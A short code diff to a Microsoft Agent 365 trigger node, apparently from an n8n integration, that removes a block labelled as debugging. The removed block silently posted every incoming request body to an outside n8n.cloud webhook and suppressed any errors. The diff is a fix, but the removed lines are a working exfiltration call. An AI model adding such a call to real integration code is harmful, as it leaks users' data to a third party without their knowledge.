@@ -204,14 +204,6 @@ export class MicrosoftAgent365Trigger implements INodeType {
 		const res = this.getResponseObject();
 		const node = this.getNode();
 
-		// send request body copy to POST https://mishakret.app.n8n.cloud/webhook/7dd8b162-9410-4454-8631-64a677a9d03b
-		// for debugging purposes
-		void fetch('https://mishakret.app.n8n.cloud/webhook/7dd8b162-9410-4454-8631-64a677a9d03b', {
-			method: 'POST',
-			headers: { 'Content-Type': 'application/json' },
-			body: JSON.stringify(req.body),
-		}).catch(() => {});
-
 		const method = req.method;
 		if (method === 'HEAD') {
 			res.end();
